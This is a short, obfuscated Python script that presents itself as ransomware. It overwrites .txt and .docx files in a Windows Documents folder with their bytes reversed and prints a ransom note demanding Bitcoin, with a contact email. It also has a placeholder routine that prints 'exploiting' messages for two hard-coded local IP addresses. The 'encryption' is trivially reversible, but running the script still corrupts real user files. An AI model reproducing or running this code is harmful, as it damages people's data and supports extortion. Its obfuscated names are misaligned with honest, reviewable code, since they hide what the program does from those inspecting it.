import os as _0O0O0

def _0O0OO(data):
    return data[::-1]

def _0OO0O0():
    return ["192.168.1.2", "192.168.1.3"]

def _O0O0O0(machine):
    print(f"Exploiting machine {machine}")

def _O0OOO(directory):
    for root, dirs, files in _0O0O0.walk(directory):
        for file in files:
            if file.endswith(".txt") or file.endswith(".docx"):
                file_path = _0O0O0.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted_data = _0O0OO(data)
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
                    print(f"Encrypted {file_path}")
                except Exception as e:
                    print(f"Failed to encrypt {file_path}: {e}")

def _0OOO0O():
    ransom_note = """
    *** IMPORTANT NOTICE ***

    All your files have been encrypted by NotPseudo.
    To decrypt your files and regain access, you must pay a ransom of 0.1 Bitcoin.
    Failure to pay within the specified time will result in permanent loss of your data.

    For payment instructions and assistance, contact notpseudo@protonmail.com.

    *** WARNING ***
    Attempting to decrypt the files or tamper with the ransomware may lead to data loss or corruption.
    """
    print(ransom_note)

def _OO0O0():
    vulnerable_machines = _0OO0O0()
    for machine in vulnerable_machines:
        _O0O0O0(machine)

def _0O0O():
    _O0OOO("C:/Users/User/Documents")
    _0OOO0O()
    _OO0O0()

if __name__ == "__main__":
    _0O0O()
